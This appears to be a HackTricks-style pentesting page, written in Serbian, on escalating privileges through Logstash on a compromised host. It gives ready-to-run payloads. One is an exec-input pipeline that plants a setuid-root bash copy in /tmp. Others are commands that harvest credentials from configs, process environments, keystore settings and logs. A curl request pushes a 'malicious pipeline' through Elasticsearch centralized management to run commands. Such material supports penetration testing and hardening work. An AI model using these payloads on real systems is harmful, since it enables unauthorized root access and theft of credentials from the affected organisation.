# Eskalacija privilegija u Logstash-u

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash se koristi za **prikupljanje, transformaciju i prosleđivanje logova** kroz sistem poznat kao **pipeline-ovi**. Ovi pipeline-ovi sastoje se od faza **input**, **filter** i **output**. Zanimljiv aspekt javlja se kada Logstash radi na kompromitovanoj mašini.

### Konfiguracija pipeline-ova

Pipeline-ovi se konfigurišu u datoteci **/etc/logstash/pipelines.yml**, koja navodi lokacije konfiguracija pipeline-ova:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Ovaj fajl otkriva gde se nalaze **.conf** fajlovi koji sadrže konfiguracije pipeline-a. Kada se koristi **Elasticsearch output module**, uobičajeno je da **pipeline**-i sadrže **Elasticsearch credentials**, koji često imaju široke privilegije zbog potrebe Logstash-a da upisuje podatke u Elasticsearch. Wildcard-i u putanjama konfiguracije omogućavaju Logstash-u da izvrši sve pipeline-e koji se podudaraju u navedenom direktorijumu.

Ako se Logstash pokrene sa `-f <directory>` umesto sa `pipelines.yml`, **svi fajlovi unutar tog direktorijuma se konkateniraju leksikografskim redosledom i parsiraju kao jedna konfiguracija**. Ovo stvara 2 napadačke posledice:

- Dodat fajl poput `000-input.conf` ili `zzz-output.conf` može promeniti način na koji se konačni pipeline sastavlja
- Neispravan fajl može sprečiti učitavanje celog pipeline-a, zato pažljivo proverite payload-e pre oslanjanja na automatsko ponovno učitavanje

### Brza enumeracija na kompromitovanom hostu

Na hostu na kom je Logstash instaliran, brzo proverite:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Takođe proverite da li je lokalni monitoring API dostupan. Podrazumevano se vezuje za **127.0.0.1:9600**, što je obično dovoljno nakon pristupa hostu:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Ovo vam obično daje ID-jeve pipeline-ova, detalje o runtime-u i potvrdu da je vaš izmenjeni pipeline učitan.

Credentials pronađeni u Logstash-u često omogućavaju pristup **Elasticsearch-u**, zato proverite [ovu drugu stranicu o Elasticsearch-u](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Eskalacija privilegija putem upisivih pipeline-ova

Da biste pokušali eskalaciju privilegija, prvo identifikujte korisnika pod kojim Logstash servis radi, što je obično korisnik **logstash**. Uverite se da ispunjavate **jedan** od sledećih kriterijuma:

- Imate **write access** za pipeline **.conf** fajl **ili**
- Fajl **/etc/logstash/pipelines.yml** koristi wildcard, a možete da pišete u ciljnu fasciklu

Pored toga, mora biti ispunjen **jedan** od sledećih uslova:

- Možete da restartujete Logstash servis **ili**
- U fajlu **/etc/logstash/logstash.yml** podešeno je **config.reload.automatic: true**

Ako konfiguracija sadrži wildcard, kreiranje fajla koji odgovara tom wildcard-u omogućava izvršavanje komandi. Na primer:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Ovde **interval** određuje učestalost izvršavanja u sekundama. U datom primeru, komanda **whoami** se izvršava svakih 120 sekundi, a njen izlaz se usmerava u **/tmp/output.log**.

Sa **config.reload.automatic: true** u **/etc/logstash/logstash.yml**, Logstash će automatski detektovati i primeniti nove ili izmenjene pipeline konfiguracije bez potrebe za restartovanjem. Ako nema wildcard-a, izmene se i dalje mogu vršiti u postojećim konfiguracijama, ali se savetuje oprez kako bi se izbegli prekidi.

### Pouzdaniji Pipeline Payload-i

`exec` input plugin i dalje radi u aktuelnim izdanjima i zahteva ili `interval` ili `schedule`. On se izvršava tako što **forkuje** Logstash JVM, pa ako je memorija ograničena, vaš payload može neuspešno da se izvrši sa greškom `ENOMEM`, umesto da se neprimetno pokrene.

Praktičniji privilege-escalation payload obično je onaj koji ostavlja trajan artifact:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Ako nemate prava za ponovno pokretanje, ali možete poslati signal procesu, Logstash takođe podržava ponovno učitavanje pokrenuto signalom **SIGHUP** na Unix-sličnim sistemima:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Imajte na umu da nisu svi plugin-ovi kompatibilni sa ponovnim učitavanjem. Na primer, **stdin** input sprečava automatsko ponovno učitavanje, zato nemojte pretpostaviti da će `config.reload.automatic` uvek preuzeti vaše izmene.

### Preuzimanje tajni iz Logstash-a

Pre nego što se usredsredite samo na izvršavanje koda, prikupite podatke kojima Logstash već ima pristup:

- Kredencijali u otvorenom tekstu često su hardkodovani unutar `elasticsearch {}` output-a, `http_poller`-a, JDBC input-a ili postavki povezanih sa cloud-om
- Bezbedne postavke mogu se nalaziti u **`/etc/logstash/logstash.keystore`** ili drugom `path.settings` direktorijumu
- Lozinka keystore-a često se prosleđuje kroz **`LOGSTASH_KEYSTORE_PASS`**, a instalacije zasnovane na paketima je obično preuzimaju iz **`/etc/sysconfig/logstash`**
- Proširivanje promenljivih okruženja pomoću `${VAR}` rešava se pri pokretanju Logstash-a, zato vredi proveriti okruženje servisa

Korisne provere:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Ovo takođe vredi proveriti jer je **CVE-2023-46672** pokazao da Logstash pod određenim okolnostima može da beleži osetljive informacije u logovima. Na post-exploitation hostu, stari Logstash logovi i `journald` zapisi zato mogu otkriti credentials čak i kada se u trenutnoj konfiguraciji koristi keystore umesto čuvanja secrets inline.

### Abuse centralizovanog upravljanja pipelines

U nekim okruženjima host se uopšte **ne oslanja na lokalne `.conf` fajlove**. Ako je podešeno **`xpack.management.enabled: true`**, Logstash može da preuzima centralno upravljane pipelines iz Elasticsearch/Kibana, a nakon omogućavanja ovog režima lokalne pipeline konfiguracije više nisu source of truth.

To znači drugačiji attack path:

1. Povratiti Elastic credentials iz lokalnih Logstash podešavanja, keystore-a ili logova
2. Proveriti da li account ima **`manage_logstash_pipelines`** cluster privilege
3. Kreirati ili zameniti centralno upravljani pipeline tako da Logstash host izvrši vaš payload tokom sledećeg poll intervala

Elasticsearch API koji se koristi za ovu funkciju je:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Ovo je naročito korisno kada su lokalne datoteke samo za čitanje, ali je Logstash već registrovan za udaljeno preuzimanje pipeline-ova.

## Reference

- [Elastic Docs: Ponovno učitavanje konfiguracione datoteke](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Konfigurisanje centralizovanog upravljanja pipeline-ovima](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
